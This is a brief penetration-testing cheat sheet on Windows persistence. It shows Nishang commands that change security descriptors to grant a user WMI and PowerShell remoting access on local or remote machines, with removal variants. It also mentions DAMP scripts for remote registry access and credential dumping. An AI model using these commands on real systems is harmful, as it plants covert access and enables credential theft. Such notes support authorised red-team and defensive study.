# DACLs - Security Descriptors

## Tool: Nishang

ACLs can be modified to allow users to access objects.

## 1) WMI

##### On local machine

    Set-RemoteWMI -UserName user1 -Verbose

##### On remote machine without explicit credentials

    Set-RemoteWMI -UserName user1 -ComputerName <computer> -namespace 'root\cimv2' -Verbose

##### On remote machine with explicit credentials. Only root\cimv2 and nested namespaces

    Set-RemoteWMI -UserName user1 -ComputerName <computer> -Credential Administrator -namespace 'root\cimv2' -Verbose

##### On remote machine remove permissions

    Set-RemoteWMI -UserName user1 -ComputerName <computer> -namespace 'root\cimv2' -Remove -Verbose

## 2) Powershell Remoting

##### On local machine

    Set-RemotePSRemoting -UserName user1 -Verbose

##### On remote machine without credentials

    Set-RemotePSRemoting -UserName user1 -ComputerName <computer> -Verbose

##### On remote machine, remove the permissions

    Set-RemotePSRemoting -UserName user1 -ComputerName <computer> -Remove

## 3) Remote Registry

With the scripts from DAMP-master. Permits to realize some actions like credentials dump via the registry.

